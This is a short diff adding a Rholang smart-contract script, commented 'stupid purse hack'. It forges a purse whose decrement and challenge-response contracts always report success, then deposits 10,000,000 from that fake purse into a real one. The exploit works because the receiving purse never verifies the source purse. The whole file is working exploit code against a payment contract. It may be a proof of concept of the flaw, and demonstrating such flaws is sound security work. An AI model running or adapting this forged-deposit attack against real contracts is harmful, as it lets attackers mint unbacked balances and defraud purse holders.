@@ -1,0 +1,25 @@
+
+// stupid purse hack
+
+// made possible by :: the recipient purse does no verification on the source purse
+new addPurseBalance in {
+    contract addPurseBalance(@amount, purse, success) = {
+        new fakePurse, fakeDecr in {
+            contract @[*fakePurse, *fakeDecr](_, success) = {
+                success!(true)
+            }
+            | contract @[*fakePurse, "getDecr"](return) = {
+                new challenge, responseCh in {
+                    return!([*challenge, *responseCh])
+                    | for ([_, answerCh] <- responseCh) { 
+                        answerCh!([*fakePurse, *fakeDecr])
+                    }
+                }
+            }
+            | @[*purse, "deposit"](amount, *fakePurse, *success)
+        }
+
+    }
+
+    | addPurseBalance(10000000, @"a real purse", @"success")
+}
